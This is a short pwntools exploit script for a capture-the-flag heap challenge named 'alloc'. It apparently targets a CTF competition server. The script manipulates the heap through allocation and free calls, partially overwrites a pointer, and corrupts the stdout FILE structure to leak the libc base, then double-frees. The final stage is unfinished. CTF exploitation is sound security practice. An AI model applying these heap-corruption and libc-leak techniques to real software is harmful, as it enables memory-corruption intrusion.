from pwn import *

e = ELF("./alloc")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("ast-alloc.chal.ctf.westerns.tokyo", 10001)
else:
  p = process(e.path, aslr=False)

def alloc(size, t=1, data="AAAA", recvall=True):
  p.sendline(str(t))
  p.sendlineafter(":", str(size))
  if size != 0: p.sendafter(": ", data)
  if recvall: p.recvuntil("choice:")

def free(t=1):
  p.sendline("4")
  p.sendlineafter(":", ["", "m", "c", "r"][t])
  p.recvuntil("choice:")

p.recvuntil("choice:")

alloc(0x1010, 3)
alloc(0xf00, 3)

alloc(0, 3)

alloc(0x31, 3)
free(3)
alloc(0, 3)

alloc(0x31, 3)

alloc(0x500, 3)
free(3)

alloc(0x500, 3, "\x50\x77")
gdb.attach(p)
alloc(0x31, 1)


alloc(0x10, 3)
alloc(0, 3)
alloc(0x31, 3, "\x00" * 0x10 + p64(0xfbad1800) + p64(0) * 3 + "\x00", False)

p.recv(8)
leak = u64(p.recv(8)) - 0x1555553288b0 + 0x0000155554f3b000
print("Libc Base: {:#x}".format(leak))
p.recvuntil("choice:")

free(2)
free(2)


p.interactive()
